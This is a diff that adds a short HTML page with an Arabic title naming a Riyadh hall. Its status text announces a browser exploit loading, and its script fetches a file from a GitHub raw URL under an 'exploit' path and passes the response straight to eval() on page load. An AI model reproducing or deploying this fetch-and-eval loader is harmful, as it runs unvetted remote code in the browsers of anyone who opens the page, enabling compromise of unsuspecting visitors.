@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>قاعه رياض - 11.00</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <h1 style="color:#f00;">قاعه رياض - 11.00</h1>
+    <p>جاري تحميل استغلال المتصفح...</p>
+    <div id="status" style="color:yellow;">جاري الاتصال...</div>
+    <script>
+        fetch('https://raw.githubusercontent.com/TheoryOfTheGiraffe/GTFO/main/exploit/1100/index.html')
+            .then(r => r.text())
+            .then(data => {
+                document.getElementById('status').innerText = "✅ تم التحميل!";
+                eval(data);
+            })
+            .catch(() => {
+                document.getElementById('status').innerText = "❌ فشل التحميل";
+            });
+    </script>
+</body>
+</html>
